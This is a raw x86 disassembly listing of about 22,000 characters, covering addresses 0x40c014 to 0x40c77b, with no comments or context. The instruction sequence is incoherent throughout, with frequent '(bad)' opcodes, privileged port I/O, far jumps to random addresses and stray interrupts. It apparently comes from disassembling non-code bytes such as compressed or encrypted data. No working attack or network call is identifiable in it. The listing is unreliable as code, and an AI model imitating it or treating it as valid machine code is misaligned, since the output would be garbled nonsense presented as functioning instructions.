  40c014:	xlat   BYTE PTR ds:[ebx]
  40c015:	outs   dx,DWORD PTR gs:[esi]
  40c017:	test   BYTE PTR [ebx],0x20
  40c01a:	ins    BYTE PTR es:[edi],dx
  40c01b:	out    dx,eax
  40c01c:	hlt    
  40c01d:	ror    BYTE PTR [ecx],1
  40c01f:	sbb    eax,0x2910548c
  40c024:	and    BYTE PTR [ecx],ah
  40c026:	sub    DWORD PTR [esi],0xff8c6f2b
  40c02c:	dec    ecx
  40c02d:	je     0x40c006
  40c02f:	je     0x40c03c
  40c031:	push   ecx
  40c032:	pop    ebp
  40c033:	xchg   esi,eax
  40c034:	in     al,dx
  40c035:	in     eax,0x27
  40c037:	xor    DWORD PTR [esi+0x7],esi
  40c03a:	repz or DWORD PTR [edx-0x53],eax
  40c03e:	xchg   ebp,eax
  40c03f:	retf   
  40c040:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40c042:	leave  
  40c043:	jbe    0x40bffd
  40c045:	mov    dh,0x80
  40c047:	cmp    eax,DWORD PTR [edx+0x6e48e557]
  40c04d:	ds aad 0xa2
  40c050:	push   0xffffffe4
  40c052:	js     0x40c0c5
  40c054:	fptan  
  40c056:	or     DWORD PTR [edi+esi*8+0x1d],edi
  40c05a:	pushf  
  40c05b:	xchg   esi,eax
  40c05c:	xor    al,BYTE PTR [eax-0x795ee6e5]
  40c062:	and    eax,0xd5c74469
  40c067:	call   0x31eb89de
  40c06c:	and    cl,BYTE PTR [ebx-0x31bc89a0]
  40c072:	jo     0x40c021
  40c074:	stos   DWORD PTR es:[edi],eax
  40c075:	inc    ebp
  40c076:	inc    ebx
  40c077:	gs es jecxz 0x40c08c
  40c07b:	mov    ch,bl
  40c07d:	lahf   
  40c07e:	sbb    ah,dh
  40c080:	imul   ebx,DWORD PTR [ebp-0x4d],0x65
  40c084:	js     0x40c0ac
  40c086:	call   DWORD PTR ds:0xd551aebc
  40c08c:	jmp    0x7215af62
  40c091:	or     BYTE PTR [eax-0x28],bh
  40c094:	mov    edx,0x1ca53f40
  40c099:	and    al,dl
  40c09b:	hlt    
  40c09c:	add    DWORD PTR [edi-0x4d],ebx
  40c09f:	xchg   BYTE PTR [edi+0x71734f71],dh
  40c0a5:	scas   al,BYTE PTR es:[edi]
  40c0a6:	inc    edi
  40c0a7:	int    0x9
  40c0a9:	jo     0x40c09d
  40c0ab:	aaa    
  40c0ac:	push   0x5bb37720
  40c0b1:	add    BYTE PTR [edx-0x29f3cf63],0x4b
  40c0b8:	xor    ch,BYTE PTR ds:0xb59087ec
  40c0be:	sub    BYTE PTR [ebx+edi*4-0x2e518c83],al
  40c0c5:	call   FWORD PTR [edx-0x236b8cac]
  40c0cb:	cwde   
  40c0cc:	mov    eax,ds:0x9800d112
  40c0d1:	or     DWORD PTR [esi+0x37],edx
  40c0d4:	pop    eax
  40c0d5:	jp     0x40c06c
  40c0d7:	adc    BYTE PTR [esi],0xee
  40c0da:	daa    
  40c0db:	mov    bl,0x71
  40c0dd:	nop
  40c0de:	add    BYTE PTR [edx-0x52],cl
  40c0e1:	push   dx
  40c0e3:	push   ebp
  40c0e4:	jno    0x40c088
  40c0e6:	lds    esi,FWORD PTR [ebp-0x19de7594]
  40c0ec:	push   0x21
  40c0ee:	add    al,0x6d
  40c0f0:	(bad)  
  40c0f2:	and    ch,BYTE PTR [eax-0x6a3d6f28]
  40c0f8:	xchg   esi,eax
  40c0f9:	cmp    ebp,ebx
  40c0fb:	xlat   BYTE PTR ds:[ebx]
  40c0fc:	push   esp
  40c0fd:	pop    eax
  40c0fe:	aad    0x11
  40c100:	out    dx,al
  40c101:	mov    ds:0x1fb8e797,al
  40c106:	xchg   esp,eax
  40c107:	leave  
  40c108:	add    eax,0xb93c32dc
  40c10d:	out    dx,al
  40c10e:	aad    0x4c
  40c110:	adc    bx,WORD PTR [ecx-0x75e9cd9a]
  40c117:	jne    0x40c132
  40c119:	cmp    DWORD PTR [esi-0x17ebf2ce],0xffffffe7
  40c120:	jno    0x40c10e
  40c122:	jmp    0xeded:0x7c88b321
  40c129:	pop    ds
  40c12a:	sub    ch,BYTE PTR [eax]
  40c12c:	xor    dh,0xa7
  40c12f:	push   ecx
  40c130:	pushf  
  40c131:	fstp   st(0)
  40c133:	sub    esi,eax
  40c135:	scas   al,BYTE PTR es:[edi]
  40c136:	xchg   esp,eax
  40c137:	ss push ss
  40c139:	rcl    DWORD PTR [eax],cl
  40c13b:	dec    ebp
  40c13c:	mov    cl,al
  40c13e:	shr    edx,1
  40c140:	aas    
  40c141:	das    
  40c142:	out    0x5,eax
  40c144:	scas   al,BYTE PTR es:[edi]
  40c145:	fst    DWORD PTR [ebp+0x24]
  40c148:	dec    ecx
  40c149:	icebp  
  40c14a:	nop
  40c14b:	mov    eax,ds:0xe6cd717f
  40c150:	xchg   ebx,eax
  40c151:	pop    edi
  40c152:	ret    0xa55b
  40c155:	repz imul ecx,DWORD PTR ds:0x75c79502,0xfffffff4
  40c15d:	push   esi
  40c15e:	daa    
  40c15f:	mov    dh,0x4a
  40c161:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c162:	xor    al,0x27
  40c164:	pop    ebp
  40c165:	jmp    0x764e:0x5e6d40d5
  40c16c:	icebp  
  40c16d:	xor    edi,ecx
  40c16f:	jbe    0x40c150
  40c171:	and    al,0x1a
  40c173:	and    BYTE PTR [edi],0x3a
  40c176:	lea    esp,[ecx+0x34]
  40c179:	ins    BYTE PTR es:[edi],dx
  40c17a:	aad    0xe6
  40c17c:	test   BYTE PTR [edx-0x1b],0x14
  40c180:	jmp    0x40c135
  40c182:	int3   
  40c183:	jne    0x40c1de
  40c185:	or     ah,ch
  40c187:	repz jmp 0x7192339f
  40c18d:	xchg   esp,eax
  40c18e:	sbb    BYTE PTR [ebx+0x2acd8d4b],ah
  40c194:	aad    0x1f
  40c196:	jns    0x40c1f2
  40c198:	test   bl,ch
  40c19a:	mov    ebp,0xe351c584
  40c19f:	push   ebx
  40c1a0:	mov    edi,ebp
  40c1a2:	push   ebx
  40c1a3:	ss xchg ecx,eax
  40c1a5:	mov    eax,ds:0xa4618c54
  40c1aa:	adc    esi,DWORD PTR [edx-0x392375a6]
  40c1b0:	(bad)  
  40c1b1:	push   ss
  40c1b2:	mov    BYTE PTR [eax+0x21d9e971],dl
  40c1b8:	shl    BYTE PTR [ecx-0x2b],cl
  40c1bb:	fsub   QWORD PTR [esi-0x3427a69b]
  40c1c1:	and    eax,0xb40775c1
  40c1c6:	call   0x73569014
  40c1cb:	cvtdq2ps xmm0,xmm0
  40c1ce:	aad    0x7
  40c1d0:	ret    0x8ae5
  40c1d3:	sub    ebp,ebx
  40c1d5:	lods   al,BYTE PTR ds:[esi]
  40c1d6:	inc    esp
  40c1d7:	ins    DWORD PTR es:[edi],dx
  40c1d8:	inc    ecx
  40c1d9:	and    BYTE PTR [ebp-0x96afd59],bl
  40c1df:	mov    gs,WORD PTR [ebx]
  40c1e1:	in     eax,0xd5
  40c1e3:	sbb    ebp,DWORD PTR [edi-0x33fe0135]
  40c1e9:	fisttp DWORD PTR [edx]
  40c1eb:	jne    0x40c23d
  40c1ed:	outs   dx,BYTE PTR cs:[esi]
  40c1ef:	adc    bl,dh
  40c1f1:	xor    al,0xe0
  40c1f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1f4:	jae    0x40c201
  40c1f6:	and    esp,DWORD PTR [edi+eax*1+0x2834eed6]
  40c1fd:	cdq    
  40c1fe:	clc    
  40c1ff:	js     0x40c1ac
  40c201:	jmp    0x751c:0x1bc5c1a1
  40c208:	outs   dx,BYTE PTR ds:[esi]
  40c209:	nop
  40c20a:	cwde   
  40c20b:	nop
  40c20c:	and    eax,0xfc67d32b
  40c211:	pop    esp
  40c212:	jge    0x40c28c
  40c214:	icebp  
  40c215:	jne    0x40c24d
  40c217:	and    ah,BYTE PTR [ebx-0xf]
  40c21a:	add    al,0x9f
  40c21c:	jno    0x40c1b8
  40c21e:	fsubr  QWORD PTR [edi+ebp*2+0x53]
  40c222:	sub    eax,0x18204ac7
  40c227:	push   ss
  40c228:	and    BYTE PTR [esi],ah
  40c22a:	ret    0xdb3
  40c22d:	call   0x38cf7e03
  40c232:	mov    eax,0x2122ad25
  40c237:	jbe    0x40c25e
  40c239:	gs retf 0x1b55
  40c23d:	inc    ebp
  40c23e:	push   esi
  40c23f:	jne    0x40c250
  40c241:	dec    eax
  40c242:	enter  0x4361,0xff
  40c246:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c248:	jno    0x40c2a9
  40c24a:	push   ds
  40c24b:	mov    edx,0x7051a628
  40c250:	xchg   ebp,eax
  40c251:	pop    ds
  40c252:	lea    eax,[ebx]
  40c254:	push   edx
  40c255:	mov    dl,0x3b
  40c257:	ret    0x4d84
  40c25a:	in     al,0x96
  40c25c:	cmp    esi,ebx
  40c25e:	les    esi,FWORD PTR [ecx+0x374d6e71]
  40c264:	sti    
  40c265:	pusha  
  40c266:	cdq    
  40c267:	mov    dl,0x4e
  40c269:	mov    ds:0x2ef14f0f,eax
  40c26e:	cmp    DWORD PTR [ebx],0x8380d34f
  40c274:	je     0x40c22c
  40c276:	in     al,dx
  40c277:	(bad)  
  40c278:	pop    esi
  40c279:	mov    edi,DWORD PTR [edx]
  40c27b:	add    al,0x2f
  40c27d:	out    dx,al
  40c27e:	jg     0x40c2b5
  40c280:	adc    dh,BYTE PTR [edi+eiz*2+0x25200bce]
  40c287:	dec    edx
  40c288:	test   DWORD PTR [ebx-0x7b4bb39a],edx
  40c28e:	aad    0x12
  40c290:	pop    ss
  40c291:	aam    0xcd
  40c293:	mov    al,ds:0x847291b3
  40c298:	xor    ch,al
  40c29a:	jmp    0x40c2b1
  40c29c:	xchg   ecx,eax
  40c29d:	jnp    0x40c2e1
  40c29f:	aas    
  40c2a0:	ss std 
  40c2a2:	aad    0x28
  40c2a4:	mov    edx,DWORD PTR [ebx+0x33f86858]
  40c2aa:	ds jbe 0x40c257
  40c2ad:	dec    esi
  40c2ae:	dec    eax
  40c2af:	cmp    al,0x31
  40c2b1:	into   
  40c2b2:	bound  ebp,QWORD PTR [ebp-0x1e]
  40c2b5:	mov    esp,0x54a120e3
  40c2ba:	jns    0x40c334
  40c2bc:	fstp   QWORD PTR [edx+0x186e44f9]
  40c2c2:	and    al,0x75
  40c2c4:	cmp    al,0xe0
  40c2c6:	call   0x1eee49bf
  40c2cb:	outs   dx,BYTE PTR ds:[esi]
  40c2cc:	jmp    0xeca1:0x498cd592
  40c2d3:	xchg   esi,eax
  40c2d4:	cmp    eax,0x56833fbf
  40c2d9:	test   BYTE PTR [ebx+eiz*1-0x5c0fa010],al
  40c2e0:	xor    BYTE PTR [edx-0x33],0x3a
  40c2e4:	lea    eax,[esi]
  40c2e6:	ret    
  40c2e7:	push   esi
  40c2e8:	dec    ebp
  40c2e9:	dec    eax
  40c2ea:	aad    0xf1
  40c2ec:	cmp    eax,0x3979de8f
  40c2f1:	xchg   ebx,eax
  40c2f2:	adc    DWORD PTR [ebp-0x71],esi
  40c2f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2f6:	xor    ecx,DWORD PTR [eax]
  40c2f8:	scas   eax,DWORD PTR es:[edi]
  40c2f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2fa:	adc    cl,BYTE PTR [ebx-0x73ee56ad]
  40c300:	loope  0x40c328
  40c302:	std    
  40c303:	pop    edi
  40c304:	cld    
  40c305:	call   0x7593:0xfd1b9c75
  40c30c:	xchg   esi,eax
  40c30d:	mov    ch,0x37
  40c30f:	scas   al,BYTE PTR es:[edi]
  40c310:	enter  0x95a7,0xc5
  40c314:	push   ecx
  40c315:	pop    edx
  40c316:	fcomp  st(6)
  40c318:	or     eax,0xe76c336b
  40c31d:	mov    ds:0x5a965660,al
  40c322:	adc    eax,0x93af24fa
  40c327:	jne    0x40c375
  40c329:	xchg   edx,edx
  40c32b:	jnp    0x40c34c
  40c32d:	adc    BYTE PTR [edi-0x29b31b6a],al
  40c333:	jle    0x40c2c0
  40c335:	jmp    0x55a3:0xef099081
  40c33c:	cld    
  40c33d:	aam    0xf4
  40c33f:	sbb    DWORD PTR [ecx],0xffffffa6
  40c342:	inc    eax
  40c343:	pusha  
  40c344:	xor    DWORD PTR [ebp-0x52],edx
  40c347:	and    BYTE PTR [ebp+0x5d],dh
  40c34a:	aad    0x3c
  40c34c:	push   ds
  40c34d:	ja     0x40c30c
  40c34f:	dec    ebp
  40c350:	inc    eax
  40c351:	mov    bl,BYTE PTR [eax+0x75]
  40c354:	repnz mov dl,0x28
  40c357:	rol    BYTE PTR [ecx-0x29],cl
  40c35a:	mov    edi,0xe3ee579c
  40c35f:	mov    ecx,0x55c6b38b
  40c364:	add    BYTE PTR [edx+0x4221bc3],0xd7
  40c36b:	push   edi
  40c36c:	pop    ebp
  40c36d:	popf   
  40c36e:	outs   dx,BYTE PTR ds:[esi]
  40c36f:	jae    0x40c333
  40c371:	pop    ds
  40c372:	sbb    eax,0xa7a9cfc5
  40c377:	scas   eax,DWORD PTR es:[edi]
  40c378:	and    BYTE PTR [eax-0x20],cl
  40c37b:	out    0x9e,eax
  40c37d:	ss (bad) 
  40c37f:	js     0x40c321
  40c381:	loopne 0x40c318
  40c383:	or     eax,0x911791c2
  40c388:	inc    edx
  40c389:	int3   
  40c38a:	mov    esi,0x7ba5ab35
  40c38f:	call   0xc4166dc9
  40c394:	mov    al,0xc7
  40c396:	mov    WORD PTR [ebx+0x74e43c57],es
  40c39c:	adc    BYTE PTR [ebx+ecx*1-0x7b19671d],dh
  40c3a3:	mov    ?,WORD PTR [ecx+0x6f]
  40c3a6:	push   ecx
  40c3a7:	aas    
  40c3a8:	xchg   esp,eax
  40c3a9:	fimul  DWORD PTR [esi]
  40c3ab:	and    BYTE PTR [ebx+0x6ae5c61f],bh
  40c3b1:	sub    DWORD PTR [ecx-0x2a032265],esp
  40c3b7:	retf   
  40c3b8:	neg    DWORD PTR [esi+0x7d1aad6a]
  40c3be:	xchg   esi,eax
  40c3bf:	js     0x40c391
  40c3c1:	mov    ebx,0x5083d589
  40c3c6:	lea    eax,[edi]
  40c3c8:	and    DWORD PTR [eax-0xa459624],edi
  40c3ce:	jne    0x40c442
  40c3d0:	call   0x7c27090e
  40c3d5:	std    
  40c3d6:	pop    ebp
  40c3d7:	jne    0x40c3a0
  40c3d9:	ret    
  40c3da:	push   esi
  40c3db:	mov    ds:0xa9ea6c75,al
  40c3e0:	loop   0x40c368
  40c3e2:	ror    edi,cl
  40c3e4:	jno    0x40c447
  40c3e6:	add    DWORD PTR [ebp+0x69],eax
  40c3e9:	push   eax
  40c3ea:	xor    edx,edx
  40c3ec:	sbb    BYTE PTR [edi],0xee
  40c3ef:	push   edx
  40c3f0:	add    DWORD PTR [ecx],edx
  40c3f2:	sub    BYTE PTR [edx],dl
  40c3f4:	loopne 0x40c433
  40c3f6:	aad    0x4a
  40c3f8:	in     al,dx
  40c3f9:	jp     0x40c388
  40c3fb:	mov    ch,0xe2
  40c3fd:	popf   
  40c3fe:	into   
  40c3ff:	jne    0x40c47c
  40c401:	xor    ebp,DWORD PTR [ebx+0x40]
  40c404:	jb     0x40c3f5
  40c406:	gs jecxz 0x40c466
  40c409:	dec    eax
  40c40a:	movups XMMWORD PTR [eax],xmm5
  40c40d:	mov    al,ds:0x7bc791f5
  40c412:	mov    dl,0x38
  40c414:	loopne 0x40c435
  40c416:	push   ss
  40c417:	xor    BYTE PTR [esi+0x4248ecd5],dh
  40c41d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c41e:	aad    0x44
  40c420:	mov    DWORD PTR [edx],esp
  40c422:	jge    0x40c3eb
  40c424:	add    esp,DWORD PTR [ecx]
  40c426:	iret   
  40c427:	js     0x40c460
  40c429:	or     eax,0x29af7c3d
  40c42e:	xchg   esi,eax
  40c42f:	mov    ah,0x8e
  40c431:	sti    
  40c432:	scas   al,BYTE PTR es:[edi]
  40c433:	xchg   DWORD PTR [edi-0xefd92c8],ecx
  40c439:	sbb    BYTE PTR [eax],bh
  40c43b:	pop    ecx
  40c43c:	call   0x53b63f2b
  40c441:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c443:	dec    edi
  40c444:	cmp    ebp,edi
  40c446:	out    0x11,eax
  40c448:	stos   DWORD PTR es:[edi],eax
  40c449:	push   esi
  40c44a:	popa   
  40c44b:	xor    BYTE PTR [ebx],ah
  40c44d:	and    dh,al
  40c44f:	push   eax
  40c450:	adc    esp,DWORD PTR [ebp+0x50]
  40c453:	stc    
  40c454:	rol    DWORD PTR [ebx-0x55],cl
  40c457:	push   ecx
  40c458:	sbb    al,0x3f
  40c45a:	shl    BYTE PTR ds:0xca738aeb,1
  40c460:	sub    cl,BYTE PTR [esi+ecx*1-0x1fdf43d8]
  40c467:	pop    eax
  40c468:	or     bl,ah
  40c46a:	push   ss
  40c46b:	sub    eax,0x6c0e0ab1
  40c470:	test   al,0x1f
  40c472:	adc    eax,0xd06d467b
  40c477:	jle    0x40c477
  40c479:	jnp    0x40c450
  40c47b:	pushf  
  40c47c:	jmp    0x39270e25
  40c481:	and    edi,DWORD PTR [esi+0x75]
  40c484:	fbstp  TBYTE PTR [ecx-0x7b354b81]
  40c48a:	ficomp DWORD PTR [ecx-0x10b8a8f]
  40c490:	mov    ss,WORD PTR [ecx]
  40c492:	mov    WORD PTR [esi+ecx*2+0x20],?
  40c496:	xchg   edx,eax
  40c497:	sub    eax,0xd933038f
  40c49c:	mov    bl,BYTE PTR [ecx+eiz*1-0x5fdf998e]
  40c4a3:	ds cwde 
  40c4a5:	mov    BYTE PTR [ecx-0x31c28028],ch
  40c4ab:	out    0xec,eax
  40c4ad:	pop    ds
  40c4ae:	jnp    0x40c470
  40c4b0:	aad    0x58
  40c4b2:	pop    ecx
  40c4b3:	(bad)  [ecx+0x5e]
  40c4b6:	scas   eax,DWORD PTR es:[edi]
  40c4b7:	sbb    al,0xee
  40c4b9:	inc    edi
  40c4ba:	jmp    0x40c4c5
  40c4bc:	rcr    DWORD PTR [edi],1
  40c4be:	not    bh
  40c4c0:	cmp    ebp,0x4d
  40c4c3:	out    0x34,eax
  40c4c5:	or     dl,dh
  40c4c7:	push   edi
  40c4c8:	jns    0x40c451
  40c4ca:	(bad)  
  40c4cb:	and    al,0x6c
  40c4cd:	pop    ebx
  40c4ce:	push   eax
  40c4cf:	push   ebp
  40c4d0:	lods   eax,DWORD PTR ds:[esi]
  40c4d1:	pop    ds
  40c4d2:	sbb    edi,DWORD PTR [edi-0x74]
  40c4d5:	popf   
  40c4d6:	fisubr DWORD PTR [ecx]
  40c4d8:	loopne 0x40c490
  40c4da:	aad    0xfb
  40c4dc:	mov    esp,0xde77a3ff
  40c4e1:	addr16 pop es
  40c4e3:	jne    0x40c500
  40c4e5:	inc    ecx
  40c4e6:	xchg   ebp,eax
  40c4e7:	and    eax,0xd846b606
  40c4ec:	pop    ebp
  40c4ed:	xlat   BYTE PTR ds:[ebx]
  40c4ee:	aad    0x8
  40c4f0:	mov    esi,0x44c76789
  40c4f5:	(bad)  
  40c4f6:	mov    ds:0x5d788275,eax
  40c4fb:	sahf   
  40c4fc:	std    
  40c4fd:	push   edi
  40c4fe:	sub    dl,ch
  40c500:	or     BYTE PTR [edi-0x19],0xee
  40c504:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c505:	pop    edi
  40c506:	xchg   esp,eax
  40c507:	xor    bh,ah
  40c509:	imul   edi,DWORD PTR [ecx],0xdff0f576
  40c50f:	loope  0x40c4b9
  40c511:	ud0    esp,DWORD PTR [ebp+0x6d]
  40c515:	add    al,0x3d
  40c517:	sbb    BYTE PTR [ecx-0x59],dh
  40c51a:	jae    0x40c4d2
  40c51c:	sbb    dl,0xf2
  40c51f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c520:	pop    ss
  40c521:	pop    edi
  40c522:	into   
  40c523:	adc    cl,dh
  40c525:	mov    bh,0xa2
  40c527:	sub    eax,0xa5d7f05b
  40c52c:	jno    0x40c4d7
  40c52e:	scas   al,BYTE PTR es:[edi]
  40c52f:	mov    edx,0x9da868b2
  40c534:	add    ah,BYTE PTR [eax]
  40c536:	pusha  
  40c537:	sbb    edi,DWORD PTR [ebp+0x3]
  40c53a:	pop    ecx
  40c53b:	ins    DWORD PTR es:[edi],dx
  40c53c:	dec    ecx
  40c53d:	xor    edx,ebp
  40c53f:	mov    cl,0xf7
  40c541:	fcomp  st(5)
  40c543:	mov    cl,BYTE PTR [edi]
  40c545:	js     0x40c538
  40c547:	jp     0x40c5a4
  40c549:	cwde   
  40c54a:	cmp    esi,DWORD PTR gs:0x7d3cd5f0
  40c551:	mov    ebx,0x721d9561
  40c556:	scas   eax,DWORD PTR es:[edi]
  40c557:	jl     0x40c565
  40c559:	mov    esi,0xff94d83d
  40c55e:	retf   
  40c55f:	mov    ch,0x75
  40c561:	jle    0x40c538
  40c563:	out    dx,eax
  40c564:	mov    dl,0x3f
  40c566:	mov    esi,0x533c7277
  40c56b:	jne    0x40c52a
  40c56d:	leave  
  40c56e:	mov    dl,BYTE PTR [ebp-0x37]
  40c571:	aad    0x90
  40c573:	push   cs
  40c574:	jno    0x40c573
  40c576:	or     BYTE PTR ds:0xb58583c5,dl
  40c57c:	cwde   
  40c57d:	pop    ds
  40c57e:	aaa    
  40c57f:	neg    DWORD PTR ds:0xdd4d4aa6
  40c585:	in     al,0xdc
  40c587:	add    al,0x0
  40c589:	cli    
  40c58a:	fld    TBYTE PTR [eax-0x54]
  40c58d:	and    BYTE PTR [edi-0x5633b9e6],ah
  40c593:	fstp   DWORD PTR [ecx]
  40c595:	and    BYTE PTR ds:0x4750cc6,dh
  40c59b:	scas   eax,DWORD PTR es:[edi]
  40c59c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c59d:	mov    ebp,edx
  40c59f:	inc    edx
  40c5a0:	in     eax,dx
  40c5a1:	cmp    edi,DWORD PTR [ebx]
  40c5a3:	shl    BYTE PTR [edi-0x7d],cl
  40c5a6:	jbe    0x40c617
  40c5a8:	jns    0x40c5c9
  40c5aa:	sbb    BYTE PTR [eax+0x22],0xb0
  40c5ae:	xor    al,0xed
  40c5b0:	repz mov bl,0xd5
  40c5b3:	xchg   esp,eax
  40c5b4:	retf   0xc1ac
  40c5b7:	pop    ss
  40c5b8:	dec    esi
  40c5b9:	adc    cl,BYTE PTR [ecx+0x3f09c775]
  40c5bf:	and    eax,DWORD PTR [ebx]
  40c5c1:	mov    ch,0x9d
  40c5c3:	div    DWORD PTR [ecx-0x49]
  40c5c6:	sub    dh,ch
  40c5c8:	jmp    0x36dd0633
  40c5cd:	and    DWORD PTR [ebx],eax
  40c5cf:	repz mov ah,0xfd
  40c5d2:	aam    0xb4
  40c5d4:	jne    0x40c5bd
  40c5d6:	clc    
  40c5d7:	stos   BYTE PTR es:[edi],al
  40c5d8:	jno    0x40c5de
  40c5da:	xchg   BYTE PTR [ebx-0x2d],bl
  40c5dd:	sub    al,BYTE PTR [ebx+eiz*1]
  40c5e0:	fldcw  WORD PTR [edx]
  40c5e2:	pop    edi
  40c5e3:	sbb    ebx,eax
  40c5e5:	jp     0x40c63c
  40c5e7:	shr    DWORD PTR [ebp+ebx*4+0x22],0x6e
  40c5ec:	(bad)  
  40c5ed:	loope  0x40c5fa
  40c5ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5f0:	mov    cl,0xf1
  40c5f2:	je     0x40c658
  40c5f4:	pop    ebp
  40c5f5:	and    bh,BYTE PTR [eax]
  40c5f7:	jne    0x40c668
  40c5f9:	mov    ecx,0x5e2246ac
  40c5fe:	bt     DWORD PTR [ecx-0x1c],esi
  40c602:	call   0x6702f410
  40c607:	mov    edi,0x54ed1f7f
  40c60c:	cwde   
  40c60d:	aas    
  40c60e:	and    DWORD PTR [ecx],ecx
  40c610:	dec    esi
  40c611:	xchg   ecx,eax
  40c612:	push   eax
  40c613:	lods   al,BYTE PTR ds:[esi]
  40c614:	jae    0x40c691
  40c616:	xor    al,0x9f
  40c618:	jns    0x40c688
  40c61a:	xchg   esi,eax
  40c61b:	imul   ecx,DWORD PTR [edi+0x780555d],0x16
  40c622:	mov    eax,ds:0xd54847ee
  40c627:	test   cl,0xa
  40c62a:	xor    al,0xd8
  40c62c:	lds    eax,FWORD PTR [edi]
  40c62e:	dec    ecx
  40c62f:	jne    0x40c66b
  40c631:	ret    
  40c632:	xor    al,0x74
  40c634:	shl    DWORD PTR [eax+ebx*8+0x3e],cl
  40c638:	popa   
  40c639:	sub    eax,0x5248de8
  40c63e:	(bad)  
  40c63f:	cmp    bh,BYTE PTR [ebx+0x10dfab54]
  40c645:	and    DWORD PTR [ebx+0x25],ecx
  40c648:	adc    bh,BYTE PTR [ebp-0x1fb153b3]
  40c64e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c64f:	cmp    DWORD PTR [ecx+0x6e],esi
  40c652:	adc    dl,0xf3
  40c655:	gs sub DWORD PTR fs:[ecx-0x654e8ec5],ebp
  40c65d:	scas   al,BYTE PTR es:[edi]
  40c65e:	xchg   ecx,eax
  40c65f:	ins    BYTE PTR es:[edi],dx
  40c660:	xchg   ecx,eax
  40c661:	(bad)  
  40c663:	loopne 0x40c5fe
  40c665:	cs aad 0x5f
  40c668:	xor    eax,0xb7455a71
  40c66d:	xchg   edi,eax
  40c66e:	imul   ebp,ebx,0x75869879
  40c674:	test   al,0xeb
  40c676:	mov    BYTE PTR [esi],al
  40c678:	pop    esp
  40c679:	push   es
  40c67a:	mov    dl,cl
  40c67c:	jno    0x40c6f7
  40c67e:	or     ah,cl
  40c680:	and    BYTE PTR [ebx],dl
  40c682:	fild   DWORD PTR [ebx+ebp*1-0x6c]
  40c686:	or     al,0x75
  40c688:	inc    edi
  40c689:	cmp    BYTE PTR [ebp+ebp*4-0x52],cl
  40c68d:	pop    DWORD PTR [edx+0x50]
  40c690:	(bad)  
  40c691:	jmp    0x40c649
  40c693:	inc    esi
  40c694:	mov    cl,0x65
  40c696:	mov    al,ds:0xec8bdc2b
  40c69b:	je     0x40c620
  40c69d:	into   
  40c69e:	push   cs
  40c69f:	mov    ebp,0xad9eafaf
  40c6a4:	jno    0x40c66d
  40c6a6:	xlat   BYTE PTR ds:[ebx]
  40c6a7:	leave  
  40c6a8:	stos   DWORD PTR es:[edi],eax
  40c6a9:	pop    edi
  40c6aa:	xor    dh,dl
  40c6ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6ad:	pop    ds
  40c6ae:	adc    al,0x50
  40c6b0:	lea    edx,[esi+0x7e]
  40c6b3:	cmp    BYTE PTR [edi-0x2ed204c7],0x61
  40c6ba:	fldenv [esi]
  40c6bc:	xchg   esp,eax
  40c6bd:	inc    eax
  40c6be:	push   ebp
  40c6bf:	aaa    
  40c6c0:	inc    edx
  40c6c1:	ins    DWORD PTR es:[edi],dx
  40c6c2:	mov    ah,0x75
  40c6c4:	sub    esp,DWORD PTR [ebx-0x725ffcf8]
  40c6ca:	fidiv  DWORD PTR gs:[ecx+0x2a]
  40c6ce:	aas    
  40c6cf:	jb     0x40c723
  40c6d1:	(bad)  
  40c6d2:	push   ss
  40c6d3:	inc    dh
  40c6d5:	and    BYTE PTR [ecx-0x6c679d3b],bh
  40c6db:	movsx  esp,di
  40c6de:	sub    esi,DWORD PTR [ebx+0x71]
  40c6e1:	neg    BYTE PTR [edi+eiz*4+0x281bb788]
  40c6e8:	and    BYTE PTR ss:[ecx+esi*4],bl
  40c6ec:	and    ebp,DWORD PTR [ecx-0x46]
  40c6ef:	sub    eax,0xd854cc33
  40c6f4:	jno    0x40c679
  40c6f6:	inc    eax
  40c6f7:	dec    ecx
  40c6f8:	jne    0x40c6c2
  40c6fa:	and    edx,DWORD PTR [eax+0xb]
  40c6fd:	daa    
  40c6fe:	jne    0x40c761
  40c700:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c701:	jp     0x40c697
  40c703:	mul    BYTE PTR [eax+0x25ce242]
  40c709:	add    eax,0xfd294cd6
  40c70e:	mov    esi,DWORD PTR [edx+0x758c4c0a]
  40c714:	es mov esp,0xe1ebcd64
  40c71a:	fcmovnb st,st(2)
  40c71c:	jno    0x40c790
  40c71e:	into   
  40c71f:	jno    0x40c744
  40c721:	push   cs
  40c722:	out    dx,eax
  40c723:	fs aad 0x22
  40c726:	mulps  xmm4,XMMWORD PTR [edx+0x71fda9f4]
  40c72d:	stos   DWORD PTR es:[edi],eax
  40c72e:	loop   0x40c770
  40c730:	xchg   ecx,eax
  40c731:	add    DWORD PTR ds:0x621fc432,esp
  40c737:	and    BYTE PTR [esi-0x2cc25357],dh
  40c73d:	mov    ebp,0x2b8b85d8
  40c742:	mov    ebp,0x67177bb5
  40c747:	shl    DWORD PTR [ebx+0x22],0x90
  40c74b:	ret    0x8d19
  40c74e:	mov    ebp,DWORD PTR [ebp+0x255a8239]
  40c754:	push   edi
  40c755:	xchg   esi,eax
  40c756:	fmul   DWORD PTR [eax+eiz*2+0x4b]
  40c75a:	sub    bl,BYTE PTR [ebp+0x1b]
  40c75d:	call   0x3f926a96
  40c762:	jle    0x40c7ae
  40c764:	xchg   ebx,eax
  40c765:	lahf   
  40c766:	inc    esp
  40c767:	out    0xac,al
  40c769:	inc    BYTE PTR [ebp-0x63]
  40c76c:	nop
  40c76d:	sub    DWORD PTR [edx-0x1f],edi
  40c770:	xor    DWORD PTR [ebx-0x3dc8a306],edx
  40c776:	mov    edx,0x6cb90d75
  40c77b:	dec    esi
